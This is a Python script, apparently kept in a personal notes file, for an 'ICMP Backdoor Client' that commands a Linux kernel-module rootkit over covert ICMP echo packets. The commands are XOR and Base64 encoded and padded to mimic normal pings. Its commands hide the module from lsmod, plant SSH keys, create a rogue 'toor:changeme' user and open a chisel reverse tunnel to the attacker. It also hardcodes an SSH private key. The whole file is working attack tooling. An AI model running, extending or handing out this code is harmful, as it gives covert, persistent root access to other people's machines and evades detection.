---
created: 2025-10-10T14:24
updated: 2025-12-21T01:43
---
```python
#!/usr/bin/env python3
"""
ICMP Backdoor Client - Base64+XOR+Chunking
"""

import socket
import struct
import time
import sys
import os
import random
from datetime import datetime
import readline
import atexit
import base64
import signal
import subprocess

class ICMPBackdoor:
    def __init__(self, target_host):
        self.target_host = target_host
        self.authenticated = False
        self.session_id = random.randint(0x1000, 0xFFFF)
        self.last_activity_time = time.time()  # Track last command sent
        
        # XOR key for additional encoding
        self.xor_key = bytes([0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56, 0x78, 0x9A])
        self.setup_readline()
        self.setup_signal_handlers()
        
        print(f"ICMP Backdoor - Base64+XOR+Chunking (obfuscated)")
        print(f"Target: {target_host}")
        print(f"Session: 0x{self.session_id:04X}\n")
    
    def setup_readline(self):
        histfile = os.path.join(os.path.expanduser("~"), ".icmp_history")
        try:
            readline.read_history_file(histfile)
            readline.set_history_length(1000)
        except FileNotFoundError:
            pass
        atexit.register(readline.write_history_file, histfile)
    
    def setup_signal_handlers(self):
        def signal_handler(signum, frame):
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
    
    def xor_encode(self, data):
        """Apply XOR encoding to data"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ self.xor_key[i % len(self.xor_key)])
        return bytes(result)
    
    def pad_with_icmp_pattern(self, data, target_size):
        """Pad data with ICMP pattern bytes to blend with real ICMP packets"""
        if len(data) >= target_size:
            return data[:target_size]
        
        padding_needed = target_size - len(data)
        padded = bytearray(data)
        # ICMP pattern: 1011 1213...3637 (0x10 to 0x37)
        # Calculate starting position in ICMP pattern
        icmp_padding_start = 0x10 + (len(data) % (0x37 - 0x10 + 1))
        
        for j in range(padding_needed):
            padding_byte = icmp_padding_start + j
            # Wrap around if we exceed 0x37
            if padding_byte > 0x37:
                padding_byte = 0x10 + ((padding_byte - 0x10) % (0x37 - 0x10 + 1))
            padded.append(padding_byte)
        
        return bytes(padded)
    
    def _send_cmd(self, cmd_str):
        """Encode (Base64+XOR, padded to 12 bytes) and send a single command string."""
        b64  = base64.b64encode(cmd_str.encode('utf-8')).decode('ascii')
        data = self.pad_with_icmp_pattern(self.xor_encode(b64), 12)
        if self.send_packet(data):
            self.last_activity_time = time.time()
            return True
        return False

    def log(self, message, level="INFO"):
        colors = {"ERROR": "\033[91m", "SUCCESS": "\033[92m", "WARNING": "\033[93m", "INFO": "\033[94m"}
        color = colors.get(level, "\033[94m")
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{color}[{timestamp}] {message}\033[0m")
    
    def calculate_checksum(self, data):
        if len(data) % 2:
            data += b'\x00'
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16
        return (~checksum) & 0xFFFF
    
    
    def send_packet(self, data, target_ip=None):
        if target_ip is None:
            target_ip = self.target_host
            
        icmp_type, icmp_code, icmp_checksum = 8, 0, 0
        icmp_id, icmp_sequence = self.session_id, 1
        
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_sequence)
        
        payload = b'\x00' * 4 + data
        
        current_payload_size = len(payload)
        target_payload_size = 56
        
        # Real ICMP structure: 16 bytes initial data, then 40 bytes ICMP pattern starting at 0x10
        # ICMP pattern: 1011 1213 1415...3637 (0x10 to 0x37, 40 bytes total)
        # Our structure: 4 bytes initial + 12 bytes data = 16 bytes, then add 40 bytes ICMP pattern
        icmp_pattern_bytes = 40  # Full ICMP pattern length
        icmp_pattern_start = 0x10  # Pattern starts at 0x10
        
        # Always add ICMP pattern padding to reach 56 bytes
        padding_needed = target_payload_size - current_payload_size
        # Generate full ICMP pattern: 1011 1213...3637 (0x10 to 0x37)
        # Always use the full pattern starting from 0x10 to match real ICMP
        icmp_padding = []
        for i in range(min(padding_needed, icmp_pattern_bytes)):
            icmp_padding.append(icmp_pattern_start + i)
        # If we need more padding (shouldn't happen with 12-byte data), repeat pattern
        while len(icmp_padding) < padding_needed:
            remaining = padding_needed - len(icmp_padding)
            for i in range(min(remaining, icmp_pattern_bytes)):
                icmp_padding.append(icmp_pattern_start + (i % icmp_pattern_bytes))
        payload += bytes(icmp_padding)
        
        packet = header + payload
        
        checksum = self.calculate_checksum(packet)
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_sequence)
        packet = header + payload
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.sendto(packet, (target_ip, 0))
            sock.close()
            return True
        except PermissionError:
            self.log("Need root privileges", "ERROR")
            return False
        except Exception as e:
            self.log(f"Network error: {e}", "ERROR")
            return False
    
    
    def sync(self):
        self.log("\033[92mSynchronizing with target...\033[0m")
        
        sync_message = f"SYNC:session_{self.session_id}_{int(time.time())}"
        base64_data = base64.b64encode(sync_message.encode('utf-8')).decode('ascii')
        xor_data = self.xor_encode(base64_data)
        target_encoded_size = 12
        
        xor_data = self.pad_with_icmp_pattern(xor_data, target_encoded_size)
        
        if not self.send_packet(xor_data):
            self.log("Failed to send sync packet", "ERROR")
            return False
        
        self.log(f"\033[92mSync packet sent: {len(xor_data)} bytes encoded data\033[0m")
        
        # Wait for sync to be processed by LKM
        time.sleep(2)
        
        # Reset authentication state - will be validated on next command
        self.authenticated = True
        self.last_activity_time = time.time()
        
        self.log("\033[92mSynchronization completed\033[0m", "SUCCESS")
        return True
    
    def needs_resync(self):
        """Check if we need to resync due to idle timeout (LKM timeout is 120 seconds)"""
        if not self.authenticated:
            return True  # Always need to sync if not authenticated
        
        current_time = time.time()
        idle_time = current_time - self.last_activity_time
        
        # Be conservative - resync if idle for more than 90 seconds
        # This gives us a 30-second safety margin before LKM's 120-second timeout
        if idle_time > 90:
            self.log(f"\033[92mIdle timeout detected: {idle_time:.1f}s since last activity, resyncing...\033[0m", "INFO")
            return True
            
        return False
    
    # All LKM command senders delegate to _send_cmd() — only the protocol string differs.
    def send_hide_command(self):   return self._send_cmd("HID:hide")
    def send_unhide_command(self): return self._send_cmd("UNH:unhide")
    def send_ssh_key_quick(self):  return self._send_cmd("SSHQ:quick")
    def send_ssh_key_full(self):   return self._send_cmd("SSHF:full")
    def send_rogue_user(self):     return self._send_cmd("ROGU:create")
    def send_rogue_cleanup(self):  return self._send_cmd("ROGC:clean")

    # ── Hardcoded keypair (ed25519) ────────────────────────────────────────────
    # Private key matches the public key embedded in snd_hda_codec.c.
    # Update both here and in setup.sh if you rotate keys.
    _LKM_PRIVATE_KEY = """\
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBRmAly3oiqgQ1aZ6HjGEXk7OMlrqKLHTtXRfiAfUQaoQAAAJDETMMpxEzD
KQAAAAtzc2gtZWQyNTUxOQAAACBRmAly3oiqgQ1aZ6HjGEXk7OMlrqKLHTtXRfiAfUQaoQ
AAAEDmyMtmTkqbatB8rktXPyMbAp3zmy9Uaz94WrTAyu2PZlGYCXLeiKqBDVpnoeMYReTs
4yWuoosdO1dF+IB9RBqhAAAACXJvb3RAa2FsaQECAwQ=
-----END OPENSSH PRIVATE KEY-----
"""
    _LKM_PUBLIC_KEY = (
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFGYCXLeiKqBDVpnoeMYReTs4yWuoosdO1dF+"
        "IB9RBqh"
    )

    def install_local_ssh_key(self):
        """Write the hardcoded LKM private key to ~/.ssh/lkm_ed25519."""
        ssh_dir = os.path.expanduser("~/.ssh")
        private_key_file = os.path.join(ssh_dir, "lkm_ed25519")
        public_key_file  = private_key_file + ".pub"

        try:
            os.makedirs(ssh_dir, mode=0o700, exist_ok=True)

            with open(private_key_file, "w") as fh:
                fh.write(self._LKM_PRIVATE_KEY)
            os.chmod(private_key_file, 0o600)

            with open(public_key_file, "w") as fh:
                fh.write(self._LKM_PUBLIC_KEY + "\n")
            os.chmod(public_key_file, 0o644)

            self.log(f"Private key written : {private_key_file}", "SUCCESS")
            self.log(f"Public key          : {self._LKM_PUBLIC_KEY}", "INFO")
            self.log(f"Connect             : ssh -i {private_key_file} root@{self.target_host}", "INFO")
            return True

        except Exception as exc:
            self.log(f"Failed to install SSH key: {exc}", "ERROR")
            return False
    
    def setup_chisel_server(self):
        """Setup and start chisel server on attacker machine (port 8443)"""
        chisel_path = "/tmp/chisel"
        chisel_url = "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz"
        
        # Check if chisel is already running
        try:
            result = subprocess.run(['pgrep', '-f', 'chisel server'], capture_output=True, text=True)
            if result.returncode == 0:
                self.log("\033[92mChisel server already running\033[0m", "SUCCESS")
                return True
        except Exception:
            pass
        
        # Check if chisel binary exists
        if not os.path.exists(chisel_path):
            self.log("\033[33mChisel not found, downloading...\033[0m", "INFO")
            try:
                # Download chisel
                subprocess.run(['wget', '-q', chisel_url, '-O', f'{chisel_path}.gz'], check=True)
                subprocess.run(['gunzip', '-f', f'{chisel_path}.gz'], check=True)
                subprocess.run(['chmod', '+x', chisel_path], check=True)
                self.log("\033[33mChisel downloaded and installed\033[0m", "SUCCESS")
            except subprocess.CalledProcessError as e:
                self.log(f"Failed to download chisel: {e}", "ERROR")
                return False
            except Exception as e:
                self.log(f"Error setting up chisel: {e}", "ERROR")
                return False
        
        # Start chisel server on port 8443 (plain HTTP, no TLS)
        self.log("\033[33mStarting chisel server on port 8443...\033[0m", "INFO")
        try:
            # Run chisel server in background
            subprocess.Popen(
                [chisel_path, 'server', '--reverse', '--port', '8443'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            time.sleep(2)  # Wait for server to start
            
            # Verify it's running
            result = subprocess.run(['pgrep', '-f', 'chisel server'], capture_output=True, text=True)
            if result.returncode == 0:
                self.log("\033[92mChisel server started on port 8443\033[0m", "SUCCESS")
                return True
            else:
                self.log("Chisel server failed to start", "ERROR")
                return False
        except Exception as e:
            self.log(f"Failed to start chisel server: {e}", "ERROR")
            return False
    
    def stop_chisel_server(self):
        """Stop chisel server"""
        try:
            subprocess.run(['pkill', '-f', 'chisel server'], capture_output=True)
            self.log("Chisel server stopped", "SUCCESS")
            return True
        except Exception as e:
            self.log(f"Failed to stop chisel server: {e}", "ERROR")
            return False
    
    def send_chisel_tunnel(self): return self._send_cmd("CHIS:t")

    def _print_help(self):
        """Print the command reference (used by startup banner and the help command)."""
        print("\nAvailable commands:")
        print("  \033[92msync\033[0m                     - Authenticate with the LKM (auto-resyncs on 90s idle)")
        print("  ssh-key-quick            - Install SSH key (LKM hardcoded pubkey)")
        print("  ssh-key-full             - Install SSH key + full sshd config (LKM hardcoded pubkey)")
        print("  rogue-user               - Create rogue user 'toor:changeme' with SSH access")
        print("  rogue-cleanup            - Remove rogue user 'toor' and traces")
        print("  hide                     - Hide module from lsmod")
        print("  unhide                   - Unhide module from lsmod")
        print("  \033[33minstall-key\033[0m              - Write LKM private key to ~/.ssh/lkm_ed25519")
        print("  \033[33mgen-keypair\033[0m              - Alias for install-key")
        print("  \033[96mchisel\033[0m                   - Create chisel tunnel (auto-starts server)")
        print("  \033[96mchisel-stop\033[0m              - Stop chisel server")
        print("  help                     - Show this help")
        print("  exit                     - Quit")

    def shell(self):
        print("\nInteractive Mode")
        self._print_help()
        

        while True:
            try:
                if self.authenticated:
                    prompt = f"\033[92m{self.target_host}\033[0m# "
                else:
                    prompt = "\033[91m[Not Connected]\033[0m> "
                
                cmd = input(prompt).strip()
                
                if not cmd:
                    continue
                
                parts = cmd.split()
                base_cmd = parts[0].lower() if parts else ""

                # Auto-resync before any command that requires authentication
                _AUTH_CMDS = {'ssh-key-quick','ssh-key-full','rogue-user','rogue-cleanup',
                              'hide','unhide','chisel','chisel-stop'}
                if base_cmd in _AUTH_CMDS and self.needs_resync():
                    self.log("Session idle — resyncing automatically...", "INFO")
                    if not self.sync():
                        self.log("Resync failed — type 'sync' to retry", "ERROR")
                        continue

                if base_cmd in ['exit', 'quit']:
                    break
                
                elif base_cmd == 'sync':
                    self.log("\033[92mExecuting sync command...\033[0m")
                    self.sync()
                
                elif base_cmd == 'ssh-key-quick':
                    if self.authenticated:
                        self.log("Sending SSH key quick command...")
                        if self.send_ssh_key_quick():
                            self.log("SSH key quick command sent successfully", "SUCCESS")
                        else:
                            self.log("Failed to send SSH key quick command", "ERROR")
                    else:
                        self.log("Sync first", "ERROR")
                
                elif base_cmd == 'ssh-key-full':
                    if self.authenticated:
                        self.log("Sending SSH key full command...")
                        if self.send_ssh_key_full():
                            self.log("SSH key full command sent successfully", "SUCCESS")
                        else:
                            self.log("Failed to send SSH key full command", "ERROR")
                    else:
                        self.log("Sync first", "ERROR")
                
                elif base_cmd == 'rogue-user':
                    if self.authenticated:
                        # Rogue user is hardcoded as 'toor' in the LKM
                        self.log("Sending rogue user creation command (toor:changeme)...")
                        if self.send_rogue_user():
                            self.log("Rogue user command sent successfully", "SUCCESS")
                            self.log("User: toor, Password: changeme", "INFO")
                        else:
                            self.log("Failed to send rogue user command", "ERROR")
                    else:
                        self.log("Sync first", "ERROR")
                
                elif base_cmd in ('install-key', 'gen-keypair'):
                    # Write hardcoded LKM keypair to ~/.ssh/lkm_ed25519
                    self.log("\033[33mInstalling LKM SSH key locally...\033[0m", "INFO")
                    self.install_local_ssh_key()
                
                elif base_cmd == 'rogue-cleanup':
                    if self.authenticated:
                        self.log("Sending rogue cleanup command (removes toor user)...")
                        if self.send_rogue_cleanup():
                            self.log("Rogue cleanup command sent successfully", "SUCCESS")
                        else:
                            self.log("Failed to send rogue cleanup command", "ERROR")
                    else:
                        self.log("Sync first", "ERROR")
                
                elif base_cmd == 'chisel':
                    # First, setup chisel server on attacker machine
                    self.log("\033[96mSetting up chisel server on attacker (this machine)...\033[0m", "INFO")
                    if not self.setup_chisel_server():
                        self.log("Failed to setup chisel server", "ERROR")
                        continue
                    
                    # Then send command to victim (requires sync first)
                    if not self.authenticated:
                        self.log("\033[92mSyncing with target first...\033[0m", "INFO")
                        if not self.sync():
                            self.log("Sync failed", "ERROR")
                            continue
                    
                    self.log("\033[96mSending chisel tunnel command (CHIS:t)...\033[0m", "INFO")
                    if self.send_chisel_tunnel():
                        self.log("\033[92mChisel tunnel command sent!\033[0m", "SUCCESS")
                        self.log("\033[92mVictim will connect to your IP (extracted from ICMP packet)\033[0m", "INFO")
                        self.log("\033[92mHardcoded: R:2222:localhost:22\033[0m", "INFO")
                        self.log("\033[92mAccess via: ssh root@localhost -p 2222\033[0m", "INFO")
                    else:
                        self.log("Failed to send chisel tunnel command", "ERROR")
                
                elif base_cmd == 'chisel-stop':
                    self.stop_chisel_server()
                
                elif base_cmd == 'hide':
                    if self.authenticated:
                        self.log("Sending hide command...")
                        if self.send_hide_command():
                            self.log("Hide command sent successfully", "SUCCESS")
                        else:
                            self.log("Failed to send hide command", "ERROR")
                    else:
                        self.log("Sync first", "ERROR")
                elif base_cmd == 'unhide':
                    if self.authenticated:
                        self.log("Sending unhide command...")
                        if self.send_unhide_command():
                            self.log("Unhide command sent successfully", "SUCCESS")
                        else:
                            self.log("Failed to send unhide command", "ERROR")
                    else:
                        self.log("Sync first", "ERROR")
                
                elif base_cmd == 'help':
                    self._print_help()
                
                else:
                    self.log(f"Unknown command: {base_cmd}. Type 'help'.", "ERROR")
                
            except KeyboardInterrupt:
                print()
                break
            except EOFError:
                break
            except Exception as e:
                self.log(f"Error: {e}", "ERROR")

def main():
    if len(sys.argv) < 2:
        print("Usage: sudo python3 injector.py <target_ip>")
        print("\nExample:")
        print("  sudo python3 injector.py 192.168.88.50")
        sys.exit(1)
    
    if os.geteuid() != 0:
        print("ERROR: Need root privileges")
        print("Run as: sudo python3 injector.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    client = ICMPBackdoor(target)
    
    if not client.sync():
        print("Failed to connect")
        sys.exit(1)
    
    client.shell()

if __name__ == "__main__":
    main()
```